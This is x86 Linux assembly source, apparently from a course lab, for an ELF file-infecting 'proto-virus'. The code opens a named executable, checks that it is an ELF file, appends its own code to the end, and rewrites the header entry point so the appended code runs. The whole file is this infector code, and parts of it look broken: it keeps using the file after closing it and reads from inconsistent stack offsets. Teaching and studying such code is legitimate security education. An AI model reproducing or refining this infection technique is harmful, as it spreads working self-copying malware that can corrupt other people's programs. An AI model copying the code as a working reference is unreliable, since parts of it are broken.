%macro syscall1 2
mov ebx, %2
mov eax, %1
int 0x80
%endmacro

%macro syscall3 4
mov edx, %4
mov ecx, %3
mov ebx, %2
mov eax, %1
int 0x80
%endmacro

%macro  exit 1
syscall1 1, %1
%endmacro

%macro  write 3
syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
syscall1 6, %1
%endmacro

%define STK_RES 200
%define RDWR 2
%define SEEK_END 2
%define SEEK_SET 0
%define fd_OFFSET 0
%define magic_OFFSET 4
%define sizeELFfile_OFFSET 4
%define virus_code_size_OFFSET 8
%define entry_ptr 0x8048080

%define ENTRY 24
%define PHDR_start 28
%define PHDR_size 32
%define PHDR_memsize 20
%define PHDR_filesize 16
%define PHDR_offset 4
%define PHDR_vaddr 8

global _start

section .text

var: dd 0

_start:
	push ebp
	mov ebp, esp
	sub esp, STK_RES           		; Set up ebp and reserve space on the stack for local storage

	;print_message

	call get_my_loc
	sub ecx, next_i-OutStr 			; get current address of OutStr
	write 1, ecx, 32 			; print "The lab 9 proto-virus strikes!" to stdout
	cmp eax, 32 				; check if the string was printed
	jl Error

	;open_file

	call get_my_loc
	sub ecx, next_i-FileName 		; get current address of FileName
	mov ebx, ecx
	open ebx, RDWR, 0777 			; open file named ELFexec2 (value of label FileName)

	;check_validity_of_opening
	mov dword [ebp-fd_OFFSET], eax 		; push to stack the fd of the file
	cmp dword [ebp-fd_OFFSET], 0 		; check if the open succeeded
	jl Error

	;check_if_ELF_file

	lea dword edi, [ebp-magic_OFFSET] 	; point to the first free memory in the stack
	read [ebp-fd_OFFSET], edi, 4 		; read 4 bytes from file
	cmp eax, 4 ; check if the all bytes was read
	jl Error
	mov dword edi, [edi] 			; dereference pointer
	cmp dword edi, 0x464c457f 		; check if the file is ELF file
	jnz Error

	; save the current entry point of the ELF file:
	
	lseek [ebp-fd_OFFSET], ENTRY, SEEK_SET
	cmp eax, -1
	jz Error
	lea dword edi, [ebp-magic_OFFSET] 	; point to the first free memory in the stack
	read [ebp-fd_OFFSET], edi, 4
	mov edi, [edi]
;	mov [var], edi

	;go_to_the_end_of_file

	lseek [ebp-fd_OFFSET], 0, SEEK_END 	; getting to the end of the file
	cmp eax, 0 				; if not succeed seeking - Error
	jl Error
	mov [ebp-sizeELFfile_OFFSET], eax 	; save size of orignial file
	mov ebx, [ebp-fd_OFFSET]

	call get_my_loc
	sub ecx, next_i-_start 			; get current address of _start label
	mov edx, ecx

	call get_my_loc
	sub ecx, next_i-virus_end 		; get current address of virus_end label
	sub ecx, edx
	mov edx, ecx				; save virus code size on edx

	mov [ebp-virus_code_size_OFFSET], edx 	; save virus code size on stack

	call get_my_loc
	sub ecx, next_i-_start 			; get current address of _start label

	; write_virus:

	write ebx, ecx, edx 			; write virus to the end of the file
	cmp eax, edx 				; check if all the bytes was written
	jl Error 				; if not - Error

	;close_file:

	mov ebx, [ebp-fd_OFFSET]
	close ebx 				; close file at the end
	cmp eax, 0
	jl Error

updateEntry:
    lseek [ebp-fd_OFFSET],0,SEEK_SET
    mov eax,ebp
    sub eax,16
    sub eax,PHDR_size
    read [ebp-fd_OFFSET], eax, PHDR_size
    mov eax,entry_ptr
    add eax, [ebp-16]
    mov [ebp - PHDR_size - 16 + ENTRY], eax
    lseek [ebp-8], 0, SEEK_SET
    mov ecx,ebp
    sub ecx,PHDR_size+16
    write [ebp-fd_OFFSET], ecx, 32
    close [ebp-fd_OFFSET]
    jmp VirusExit


VirusExit: 					; exit virus
	exit 0

virus:
    call get_my_loc
    sub ecx, next_i - OutStr
    write 1, ecx, 32
    jmp VirusExit

Error:
	call get_my_loc
	sub ecx, next_i-Failstr 		; get current address of Failstr
	write 1, ecx, 13 			; print "This is a virus" to stdout
	exit 1

FileName: 	db 	"ELFexec2short", 0
OutStr: 	db	"The lab 9 proto-virus strikes!", 10, 0
Failstr:        db 	"perhaps not", 10 , 0

get_my_loc:
	call next_i
next_i:
	pop ecx
	ret

PreviousEntryPoint: dd VirusExit

virus_end:

